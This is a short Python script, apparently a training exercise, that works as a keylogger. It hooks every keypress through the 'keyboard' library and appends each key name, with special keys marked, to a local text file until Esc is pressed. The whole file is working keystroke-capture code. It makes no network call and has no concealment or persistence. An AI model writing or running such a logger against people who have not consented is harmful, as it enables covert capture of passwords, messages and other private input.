import keyboard

special_keys = ['shift', 'shift_r', 'ctrl', 'ctrl_l', 'ctrl_r', 'alt', 'alt_gr']

# Define the function to log keystrokes
def on_press(key):
    try:
        # Check if the pressed key is a special key
        if key.name in special_keys:
            with open("D:\Prodigy/keylog.txt", "a") as f:
                f.write(f"[Special Key: {key.name}]\n")
        else:
            with open("D:\Prodigy//keylog.txt", "a") as f:
                f.write(f"{key.name}\n")
    except AttributeError:
        # Handle special keys like 'Shift', 'Ctrl', etc.
        with open("D:\Prodigy/keylog.txt", "a") as f:
            f.write(f"[Special Key: {key}]\n")

# Start listening for key presses
keyboard.on_press(on_press)

# Keep the script running
keyboard.wait('esc')  # You can change 'esc' to any key to stop logging
